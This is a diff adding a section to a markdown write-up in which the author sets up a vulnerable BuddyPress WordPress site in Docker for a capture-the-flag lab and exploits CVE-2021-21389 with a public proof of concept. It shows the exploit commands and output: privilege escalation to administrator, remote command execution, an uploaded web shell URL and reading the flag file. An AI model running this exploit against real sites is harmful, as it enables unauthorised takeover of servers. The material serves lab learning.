@@ -1476,6 +1476,181 @@ And now the upload worked...<br>
 <img src="../../images/buddy_upload_success.png" alt="php_screenshot" style="width:400px;"/>
 
 <br><br>
+
+<hr>
+
+## EXTRA LEARNING FOR DOCKER WORKINGS
+### NOTE:  Create and use volumes instead of the host system volumes
+When I did a reboot on my ubuntu host, all of my databases and web files went away... no worries because I had everything saved.<br>
+I did an experiement and rebuilt, but created a volume within docker and used that to mount the files... they stayed upon reboot.<br>
+So I simply changed my run script to include the new volume.<br>
+
+```
+CREATE THE VOLUME
+@ubuntu:~$ sudo docker volume create --name=ctfWPbuddyvolumemysql ctfWPbuddyvolumemysql
+
+VIEW THE VOLUME
+@ubuntu:~$ sudo docker volume ls
+DRIVER    VOLUME NAME
+local     995415b86cba68d65c3909ab5e0e597eb0ae3c7609bb6d3a042a86cc92a0a545
+local     ctfWPbuddyvolumemysql
+local     ctfWPbuddyvolumewww
+```
+<br><br>
+To get the files into the volumes, just use the docker cp command.<br>
+
+[Docker Docs](https://docs.docker.com/engine/reference/commandline/cp/) - Docker copy reference
+
+<br>
+I made sure to test this with another reboot... it worked just fine.<br>
+Now back to it...<br>
+Buddypress is now installed and activated, and survives reboots.<br>
+
+<br>
+
+<img src="../../images/buddypress_activated.png" alt="php_screenshot" style="width:400px;"/>
+
+<br><br>
+
+<hr>
+Let's exploit this buddy!<br>
+This installation should contain a vulnerability for CVE-2021-21389<br>
+A simple google will give a great resource for Proof of Concept (google:  CVE-2021-21389 POC)<br>
+
+[CVE-2021-21389 PoC](https://github.com/HoangKien1020/CVE-2021-21389) - HoangKien1020's script
+
+<br>
+So just do a wget to your attack machine and follow the directions...<br>
+
+```
+@ubuntu:~/Docker/ctf/ctfWPbuddypress/CVE-2021-21389$ python3 CVE-2021-21389.py http://172.17.0.3 test 1234 whoami
+[+] Try to register ...
+[-] Can't register because registration is disabled!
+```
+<br>
+
+But as you can see, wordpress doesn't allow registrations right now... so let's change that.<br>
+Settings --> check box: "Anyone can register" <br>
+
+<br>
+
+<img src="../../images/allow_registration.png" alt="php_screenshot" style="width:400px;"/>
+
+<br><br>
+Although registration was enabled, the Apache server is not configured for the proper permalink...<br>
+I'll have to fix that next. <br>
+<br>
+
+<img src="../../images/redirect_not_enabled.png" alt="php_screenshot" style="width:400px;"/>
+
+<br><br>
+
+This same error will be seen when trying to register (it redirects to /register).<br>
+There could be two reasons... Apache2 dicrectory not set to AllowOverride, or the 'a2enmod rewrite' not enabled. <br>
+The first possibility is confirmed in the /etc/apache2/apache2.conf file:<br>
+<br><br>
+
+```
+<Directory /var/www/>
+	Options Indexes FollowSymLinks
+	AllowOverride None
+	Require all granted
+</Directory>
+```
+
+<br><br>
+The second is simple to fix throug the build... and why not take care of both while I'm at it...<br>
+<br><br>
+
+I'll add this to the dockerfile and rebuild (it's quick when you rebuild on itself).<br>
+<br>
+
+```
+# WRITE APACHE CONFIGS
+RUN echo ""
+RUN echo "<Directory /var/www/>" >> /etc/apache2/apache2.conf
+RUN echo "	Options Indexes FollowSymLinks" >> /etc/apache2/apache2.conf
+RUN echo "	AllowOverride All" >> /etc/apache2/apache2.conf
+RUN echo "	Require all granted" >> /etc/apache2/apache2.conf
+RUN echo "</Directory>" >> /etc/apache2/apache2.conf
+RUN echo ""
+RUN echo "ServerName Localhost" >> /etc/apache2/apache2.conf
+RUN apache2ctl configtest
+RUN a2dissite 000-default
+RUN a2enmod rewrite
+```
+
+<br>
+
+<img src="../../images/redirect_not_enabled.png" alt="php_screenshot" style="width:400px;"/>
+
+<br><br>
+And now the redirect works... (green background).<br>
+So I'll try the exploit once again<br>
+<br>
+
+```
+@ubuntu:~/Docker/ctf/ctfWPbuddypress/CVE-2021-21389$ python3 CVE-2021-21389.py http://172.17.0.3 test2 1234 whoami
+[+] Try to register ...
+[+] Try to login ...
+[+] Login successfully!
+[+] Creating new group to get X-WP-Nonce
+[-] The site needs to enable User Groups component!
+```
+
+<br><br>
+I'm guessing that's a group policy within the plugsin... I found a "User Groups" option, so I'll try that.<br>
+
+<br>
+
+<img src="../../images/buddypress_groups.png" alt="php_screenshot" style="width:400px;"/>
+
+<br><br>
+And there it was... vulnerable now...<br>
+
+```
+@ubuntu:~/Docker/ctf/ctfWPbuddypress/CVE-2021-21389$ python3 CVE-2021-21389.py http://172.17.0.3 test2 1234 whoami
+[+] Try to register ...
+[-] That username already exists!
+[+] Try to login this username ....
+[+] Login successfully!
+[+] Try to login ...
+[+] Login successfully!
+[+] Creating new group to get X-WP-Nonce
+[+] Privilege Escalation to Administrator!
+[+] Checking RCE ...
+[+] RCE via whoami command:
+www-data
+
+[+] Link RCE: 
+http://172.17.0.3/wp-content/uploads/2021/12/cve202121389.php?cmd=whoami
+[+] Done!
+```
+
+<br><br>
+And finally, if the attacker didn't feel like uploading a shell via the new admin account...<br>
+They could simply take a look at the /etc/passwd file and see the user...<br>
+And cat the user flag:<br>
+
+```
+@ubuntu:~/Docker/ctf/ctfWPbuddypress/CVE-2021-21389$ python3 CVE-2021-21389.py http://172.17.0.3 test2 1234 'cat /home/tpzuser/user.txt'
+[+] Try to register ...
+[-] That username already exists!
+[+] Try to login this username ....
+[+] Login successfully!
+[+] Try to login ...
+[+] Login successfully!
+[+] Creating new group to get X-WP-Nonce
+[+] Privilege Escalation to Administrator!
+[+] Checking RCE ...
+[+] RCE via cat /home/tpzuser/user.txt command:
+tpz{flag}
+
+[+] Link RCE: 
+http://172.17.0.3/wp-content/uploads/2021/12/cve202121389.php?cmd=cat /home/tpzuser/user.txt
+[+] Done!
+```
+
 <hr>
 
 ## THE YML (OR YAML) FILE
